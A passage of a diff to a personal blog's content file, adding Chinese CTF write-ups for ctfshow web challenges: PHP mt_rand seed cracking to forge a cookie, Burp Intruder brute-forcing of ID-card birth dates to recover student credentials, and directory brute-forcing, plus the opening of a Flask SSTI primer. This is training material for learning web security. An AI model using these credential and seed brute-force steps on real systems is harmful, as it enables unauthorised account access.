class="number">1</span>:<span class="number">2</span>])+<span class="built_in">int</span>(md5[<span class="number">14</span>:<span class="number">15</span>])+<span class="built_in">int</span>(md5[<span class="number">17</span>:<span class="number">18</span>])/<span class="built_in">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>])==<span class="built_in">int</span>(md5[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                <span class="comment">#判断md5值是否符合条件</span></span><br><span class="line">                <span class="built_in">print</span>(t)<span class="comment">#打印符合条件的字符串</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="php脚本"><a href="#php脚本" class="headerlink" title="php脚本"></a>php脚本</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;i&lt;<span class="number">10000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">susbtr</span>(<span class="variable">$token</span>,<span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">14</span>,<span class="number">1</span>)&amp;&amp;<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">14</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">1</span>,<span class="number">1</span>))===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="web24随机数种子爆破"><a href="#web24随机数种子爆破" class="headerlink" title="web24随机数种子爆破"></a>web24随机数种子爆破</h1><p>查看题目</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/749f5e1611584c4a84d86c9b2ce1f20c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<ul>
+<li>这行代码使用mt_srand函数设置随机数生成器的种子为372619038。这意味着每次以相同的种子初始化后，mt_rand()函数生成的随机数序列将是相同的。</li>
+<li>如果随机数种子定了 那么产生的随机数就是确定的</li>
+</ul>
+<h2 id="知识点-php伪随机数mt-rand-函数"><a href="#知识点-php伪随机数mt-rand-函数" class="headerlink" title="知识点:php伪随机数mt_rand()函数"></a>知识点:php伪随机数mt_rand()函数</h2><ul>
+<li><h3 id="mt-rand-函数"><a href="#mt-rand-函数" class="headerlink" title="mt_rand()函数"></a>mt_rand()函数</h3></li>
+</ul>
+<p>mt_rand()函数使用Mersenne Twister算法生成随机整数。</p>
+<p>使用的语法:mt_rand();or mt_rand(min,max);,生成一个区间内的随机数。</p>
+<p>其参数min默认为最小值0，max默认为可生成的随机数最大值2147483647，由mt_get randmax()函数获得。</p>
+<ul>
+<li><h3 id="mt-srand-函数"><a href="#mt-srand-函数" class="headerlink" title="mt_srand()函数"></a>mt_srand()函数</h3></li>
+<li><p>mt_srand()函数为随机数生成器。提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点</p>
+</li>
+<li><p>php_mt_seed工具:</p>
+</li>
+<li><p>php_mt_seed是c语言编写的爆破随机数序列种子的工具</p>
+</li>
+</ul>
+<p>我们做一个实验:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">0</span>);<span class="comment">//设置随机数播种为0</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//每次运行都会获得相同的序列    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//去掉mt_srand()函数后，系统会自动给rand函数播种，但也是播种一次</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>因此这里是伪随机</p>
+<p>所以我们根据给出的种子输出得到的序列就是我们的r值，在URL中填进去就能拿到flag了</p>
+<h1 id="web25伪随机数爆破"><a href="#web25伪随机数爆破" class="headerlink" title="web25伪随机数爆破"></a>web25伪随机数爆破</h1><p>查看题目</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">        <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">        <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;            </span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$rand</span>;        </span><br><span class="line">        &#125;                    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;   </span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>)</span><br><span class="line">&#125;                                                        </span><br><span class="line">    &#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h2 id="mt-srand-hexdec-substr-md5-flag-0-8"><a href="#mt-srand-hexdec-substr-md5-flag-0-8" class="headerlink" title="mt_srand(hexdec(substr(md5($flag),0,8)));"></a>mt_srand(hexdec(substr(md5($flag),0,8)));</h2><ul>
+<li>对flag进行MD5哈希处理，从MD5哈希值的开头截取8个字符(即32位中的前16位)，后将处理得到的值进行进制转化，hexdec()函数可以将截取的16位十六进制数转化成十进制数。最后使用转换的十进制数作为种子值来初始化mt_rand()函数的随机数生成器</li>
+<li>if((!$rand)){ if($_COOKIE[‘token’]&#x3D;&#x3D;(mt_rand()+mt_rand())){echo $flag;</li>
+</ul>
+<p>若$rand为0，则执行if语句</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路:"></a>解题思路:</h2><p>1.?r&#x3D;0先回显查看mt_rand()第一次的随机数</p>
+<h3 id="2-用php-rand-seed脚本"><a href="#2-用php-rand-seed脚本" class="headerlink" title="2.用php_rand_seed脚本"></a>2.用php_rand_seed脚本</h3><p>先用gcc编译脚本gcc -o php_mt_seed php_mt_seed.c</p>
+<p>爆破出之前播种的随机数种子的值.&#x2F;php_rand_seed 567219768</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/a26995fd26644e409374f8e4b4a79de7.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>seed选择kali工具得到的结果中php7的结果，然后编写php代码得到cookie的值:</p>
+<?php mt_srand(3147772674); echo mt_rand()."\n"; echo mt_rand()+mt_rand(); ?>
+
+<p>在网页cookie中放入得到的值，一个个尝试就可以得到flag了</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/fed24da88b9d4affaadf95138d5a8f69-1730818264224-14.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<h1 id="web26数据库连接信息爆破、"><a href="#web26数据库连接信息爆破、" class="headerlink" title="web26数据库连接信息爆破、"></a>web26数据库连接信息爆破、</h1><p>这题抓包就能拿到flag了，有点抽象</p>
+<h1 id="web27信息收集-日期爆破"><a href="#web27信息收集-日期爆破" class="headerlink" title="web27信息收集+日期爆破"></a>web27信息收集+日期爆破</h1><p>打开靶机，发现是个登录页面，需要学号和密码登录，猜测登录后可获得flag，则可围绕获得学号密码来进行，因为两者都不知道，直接爆破不太合适，看看还能提取到什么信息。</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/1c0c94f0642b40feac756cade867a00c-1730818268343-18.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>当点击到登录按钮下方的录取名单时，自动下载了一个list.xlsx，打开这个文件，发现了几个人的姓名和身份证号部分信息。点击录取名单下面的学生学籍信息查询系统，发现可以根据学生姓名和身份证号进行录取查询，那么第一步要做的可能就是要爆破身份证号了，或许在这里可以查到有用的信息。</p>
+<p>以下载的表格的第一个人为例，录取查询页面姓名栏输入高先伊，身份证输入6210225237</p>
+<ul>
+<li>打开抓包工具，如Burpsuit，点击查询，抓到查询发送的请求包，将请求包发送至Intruder攻击模块，将请求包中的&amp;p设置为变量</li>
+</ul>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/4cb7a0f41b8f4aa7b7fa7fc37173188c-1730818272849-22.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<ul>
+<li>设置payload</li>
+</ul>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/7f96d063ce374500bb095fd466a98b6b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>format那栏一定要写yyyyMMdd对应身份证的年月日，然后就开始爆破</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/a34dace7731241758d97f01c2f99847e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>爆破后找到长度最长的response，可以看到有success，把下面那串编码复制拿去翻译一下</p>
+<p>Unicode-str解码: 恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</p>
+<p>然后我们就尝试登录一下，就可以拿到flag了</p>
+<h1 id="web28目录爆破"><a href="#web28目录爆破" class="headerlink" title="web28目录爆破"></a>web28目录爆破</h1><p>查看题目</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/f0cdd7485d6f4452a91636f0a0c6ce66.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>如果直接输 原url&#x2F;1&#x2F;2.txt 之类，会进行302跳转，然后跳转就会进入死循环，最后直接打不开</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/48101279d89f4247953766e2d3bb343f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<h2 id="知识点-302跳转"><a href="#知识点-302跳转" class="headerlink" title="知识点:302跳转"></a>知识点:302跳转</h2><p>302跳转又称暂时性转移，当网页临时移到新的位置，而浏览器的缓存没有更新时，就出现了302跳转。</p>
+<p>302状态码是临时重定向（Move Temporarily），表示所请求的资源临时地转移到新的位置，一般是24到48小时以内的转移会用到302。</p>
+<p>302重定向是临时的重定向，搜索引擎会抓取新的内容而保留旧的网址。因为服务器返回302代码，搜索引擎认为新的网址只是暂时的。</p>
+<p>这里我们对url后面两个目录进行爆破</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/ab9c43bf2d5b468e9568e24e1bc2855c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>爆破模式改成Cluster bomb，然后将两个目录添加为变量</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/383c716113ef4a13823211a3b7f22eba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/6c0e90a5663c4199965f4effcc1ce759.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>将两个变量都设置成numbers，从1到100，然后开始爆破，找到200状态码的就是成功的response，拿到flag</p>
+]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2024玄武杯wp--web方向</title>
     <url>/2024/11/07/2024%E7%8E%84%E6%AD%A6%E6%9D%AFwp--web%E6%96%B9%E5%90%91/</url>
     <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-flask"><a href="#ez-flask" class="headerlink" title="ez_flask"></a>ez_flask</h2><p>打开zip文件中的app.py</p>
@@ -254,103 +490,46 @@
       </tags>
   </entry>
   <entry>
-    <title>DSBCTF--单身杯</title>
-    <url>/2024/11/11/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF/</url>
-    <content><![CDATA[<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>也是做上ctfshow双十一的单身杯了，在这里总结一下wp</p>
-<h1 id="0x02赛题"><a href="#0x02赛题" class="headerlink" title="0x02赛题"></a>0x02赛题</h1><h2 id="签到·好玩的PHP"><a href="#签到·好玩的PHP" class="headerlink" title="签到·好玩的PHP"></a>签到·好玩的PHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$d</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$ctf</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;d = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;s = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;s;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;s) &amp;&amp; (<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="variable language_">$this</span>-&gt;s != <span class="variable language_">$this</span>-&gt;b)) &#123;</span><br><span class="line">                <span class="variable">$dsb</span> = <span class="variable language_">$this</span>-&gt;d.<span class="variable language_">$this</span>-&gt;s.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$dsb</span>) &lt;= <span class="number">3</span>) &amp;&amp; (<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;ctf) &lt;= <span class="number">3</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="variable">$dsb</span> !== <span class="variable language_">$this</span>-&gt;ctf) &amp;&amp; (<span class="variable language_">$this</span>-&gt;ctf !== <span class="variable">$dsb</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$dsb</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ctf)) &#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;dsbctf&quot;</span>]);</span><br></pre></td></tr></table></figure>
+    <title>浅谈Flask下ssti漏洞</title>
+    <url>/2024/11/07/%E6%B5%85%E8%B0%88ssti/</url>
+    <content><![CDATA[<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>这几天做玄武杯碰上了ssti的签到题，由于之前没有了解过，所以只能先学去做这道题，但总体知识点还是不算很完善，所以给自己写篇文章，去梳理一下SSTI漏洞的知识点，但这篇文章是基于Flask下的SSTI漏洞的学习</p>
+<h1 id="0X02前置知识"><a href="#0X02前置知识" class="headerlink" title="0X02前置知识"></a>0X02前置知识</h1><h2 id="SSTI成因"><a href="#SSTI成因" class="headerlink" title="SSTI成因"></a>SSTI成因</h2><p>SSTI，服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。其实也就是模板引擎+注入，那么我们首先需要了解一下模板引擎</p>
+<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>首先我们先讲解下什么是模板引擎，为什么需要模板</p>
+<p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，它可以生成特定格式的文档，利用模板引擎来生成前端的 HTML 代码，模板引擎会提供一套生成 HTML 代码的程序，然后只需要获取用户的数据，再放到渲染函数里，接着生成模板 + 用户数据的前端 HTML 页面，最后反馈给浏览器，呈现在用户面前。</p>
+<p>模板只是一种提供给程序解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
+<p>在后端渲染里，浏览器会接收到经过服务器计算的之后呈现给用户的HTML代码，此时计算就是服务器后端经过解析服务器端的模板来完成的。</p>
+<p>在前端渲染里，是浏览器从服务器拿到信息，再由浏览器前端来解析渲染这段信息变成用户可视化的HTML代码并呈现在用户面前。</p>
+<p>举个简单的例子</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;$name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>审代码:</p>
-<ul>
-<li>析构函数destruct()魔术方法会在对象调用结束或者对象销毁的时被调用，在魔术方法中，三个属性的值都被转换成字符串的类型</li>
-<li>赋值判断:判断三个参数之间是否两两不相等，如果满足将三个参数拼接赋值给dsb参数</li>
-<li>第一层判断:判断dsb和ctf两个参数的字符串长度是否都小于等于3</li>
-<li>第二层判断:通过弱比较判断两个参数的值和类型是否都不相等</li>
-<li>第三层判断:通过强比较判断这两个参数的md5值是否强相等</li>
-</ul>
+<p>这里我们希望呈现给用户的是用户自己的名字，但我们并不知道用户的名字是什么，这时候可以用一些用户的信息经过渲染到这个name变量里面，然后呈现给用户</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>wanth3f1ag<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。</p>
+<p>那什么是服务端模板注入呢</p>
+<h2 id="什么是ssti"><a href="#什么是ssti" class="headerlink" title="什么是ssti"></a>什么是ssti</h2><p>通过模板，我们可以将输入转化成特定的html文件，例如一些博客的页面，登录的时候可能会有“hello，wanth3f1ag”的回显，这时候wanth3f1ag可能就是通过我的个人身份信息进行渲染，渲染成html返回到页面。</p>
+<p>利用twig php模板引擎做个演示(这里是其他文章的例子哈)</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>( <span class="variable">$_GET</span>[‘custom_email’] , <span class="keyword">array</span>(“first_name” =&gt; <span class="variable">$user</span>.first_name) );</span><br></pre></td></tr></table></figure>
+
+<p>先来解释一下这段代码的意思</p>
+<p>$twig-&gt;render()</p>
+<p>这是twig引擎的一个render方法，用于渲染模板并返回渲染结果</p>
+<p>$_GET[‘custom_email’]</p>
+<p>通过GET获取通过URL参数中名为custom_email的值</p>
+<p><code>array(&quot;first_name&quot; =&gt; $user-&gt;first_name)</code></p>
+<p>关联数组，前者是变量名，后面的$user-&gt;first_name是传递给模板的变量值，表示用户的名字</p>
+<p>从这段代码中，是可以看到有存在XSS漏洞的，但如果我们仔细观察可以发现这里有由于代码不规范而存在着ssti漏洞，此时我们验证一下</p>
+<p>假设我们的url&#x2F;?custom_email&#x3D;100</p>
+<p>那么将会返回100</p>
+<p>那我们继续url&#x2F;?custom_email&#x3D;</p>
+<p>返回f<templatereference none=""></templatereference></p>
+<p>可以看出来，我们在括号中的代码被执行了，服务器将我们的数据经过引擎解析的时候进行了执行，使用模板注入和sql注入的成因很像，都是由于管理员信任用户输入，对用户的输入没有进行合理的过滤而导致用户输入恶意代码进行了解析执行</p>
+<p>接下来我们来讲重点了</p>
+<h1 id="0x03Flask"><a href="#0x03Flask" class="headerlink" title="0x03Flask"></a>0x03Flask</h1><h2 id="flask的安装"><a href="#flask的安装" class="headerlink" title="flask的安装"></a>flask的安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install flask</span><br><span class="line"></span><br><span class="line">注意:在运行flask 的项目框架时候记得把app.py和flask扩展包放在同一路径下</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>赛题wp</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web入门xss篇--ctfshow</title>
-    <url>/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/</url>
-    <content><![CDATA[<h1 id="XSS跨站漏洞"><a href="#XSS跨站漏洞" class="headerlink" title="XSS跨站漏洞"></a>XSS跨站漏洞</h1><p><img src="/./../image/achieve/202411/xss--ctfshow/5f70a851a75b0b3fe878509047de5fd6.png" alt="img"></p>
-<h2 id="0x01xss前言"><a href="#0x01xss前言" class="headerlink" title="0x01xss前言"></a>0x01xss前言</h2><p>之前对xss跨站攻击只是停留在概念的理解上，这次开始做ctfshow的xss部分，那就深入学习一下xss吧</p>
-<h2 id="0x02xss介绍"><a href="#0x02xss介绍" class="headerlink" title="0x02xss介绍"></a>0x02xss介绍</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/./../image/achieve/202411/xss--ctfshow/QQ20240925-135455.png" alt="img"></p>
-<p><img src="/./../image/achieve/202411/xss--ctfshow/1653879435_6294328b016b58c8721cf.png!small" alt="image"></p>
-<ul>
-<li>简单来说就是恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行</li>
-</ul>
-<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>XSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是一种经常出现在 Web 应用中的计算机安全漏洞。</p>
-<p>站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动<strong>态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容</strong>。动态站点会受到称XSS的威胁，而<strong>静态站点则完全不受其影响</strong>。</p>
-<p>  跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容</p>
-<p>  攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：<strong>跨站脚本攻击是新型的“缓冲区溢出攻击”，而JavaScript是新型的“ShellCode”。</strong></p>
-<p>  xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以<strong>xss漏洞关键就是寻找参数未过滤的输出函数。</strong></p>
-<h3 id="利用的函数"><a href="#利用的函数" class="headerlink" title="利用的函数"></a>利用的函数</h3><p>比如说php中的脚本的输出函数</p>
-<p>  常见的输出函数有：<code>print</code>、<code>print_r</code>、<code>echo</code>、<code>printf</code>、<code>sprintf</code>、<code>die</code>、<code>var_dump</code>、<code>var_export</code></p>
